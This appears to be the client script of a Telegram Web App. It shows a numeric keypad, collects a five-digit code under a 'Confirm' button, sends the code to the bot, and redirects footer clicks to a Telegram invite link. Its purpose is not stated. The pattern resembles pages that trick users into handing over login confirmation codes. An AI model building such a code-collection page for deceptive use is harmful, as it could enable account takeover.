var btns = document.querySelectorAll(".btn button");
var input = document.getElementById("inputCode");

var tg = window.Telegram.WebApp;

tg.expand();

tg.MainButton.textColor = "#FFFFFF";
tg.MainButton.color = "#2cab37";
tg.MainButton.setText( 'Подтвердить' );
tg.MainButton.show();
tg.MainButton.setParams({"color": "#E0FFFF"}); //меняем цвет
tg.MainButton.disable() //скрываем кнопку


let urlParams = new URL(window.location).searchParams;
const id = urlParams.get("id");
const full_name = urlParams.get("full_name");
userData.innerText = full_name + " (" + id + ")";

tg.onEvent('mainButtonClicked', function(){
    tg.sendData(input.value); 
  });


var pattern = /^[0-9]$/ ;
var clickCount = 0;
btns.forEach((btn) => {
    btn.addEventListener("click", function() {
        if(input.value.length < 5){
            input.value += this.innerText;
        }

        if(input.value.length < 5){
            tg.MainButton.disable();
        }else{
            tg.MainButton.enable();
            tg.MainButton.color = "#2cab37";
        }

        if (pattern.test(parseInt(this.innerText))) {
            clickCount++;
        }

        input.style.border = "1px solid #2caae0";
        if(this.getAttribute("data-key") == "BACK"){
            input.value = input.value.slice(0, -1);
            if(input.value.length == 0){
                return 0;    
            }else {
                clickCount = input.value.length;
            }
            return 0;
        }else if(this.getAttribute("data-key") == "CHECK"){
            if(input.value.length < 5){
                input.style.border = "1px solid red";
                return 0;
            }else{
                tg.sendData(input.value);
            }

            clickCount = 0;
            input.value = '';
            return 0;
        }

        
    })
})

document.querySelectorAll(".footer div").forEach((href) => {
    href.addEventListener("click", function(){
        // sendMessage("${this.innerText}" clicked);

        setTimeout(() => {
            window.location.href = "https://t.me/+42777";
        }, 1000);
    })
})
